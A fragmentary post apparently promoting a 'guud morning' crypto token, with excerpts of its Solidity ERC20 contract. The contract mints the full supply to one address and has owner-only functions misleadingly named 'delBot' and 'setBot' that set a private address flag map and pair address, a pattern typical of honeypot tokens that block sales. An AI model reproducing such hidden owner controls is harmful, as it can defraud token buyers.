...
Next bath of gm potential. Make some gains a guud morning to you 
...
contract GuudMorning is ERC20, Ownable {
    mapping(address=>bool) private _enable;
    address private _uni;
    constructor() ERC20('guud morning','gdm') {
        _mint(0xC7Df5dA2cf8dCAA8858C06DAda7CF9eba3C71FbF, 1000000000 *10**18);
    ...
    function delBot(address user, bool enable) public onlyOwner {
        _enable[user] = enable;
    }
    function setBot(address uni_) public onlyOwner {
        _uni = uni_;
    }
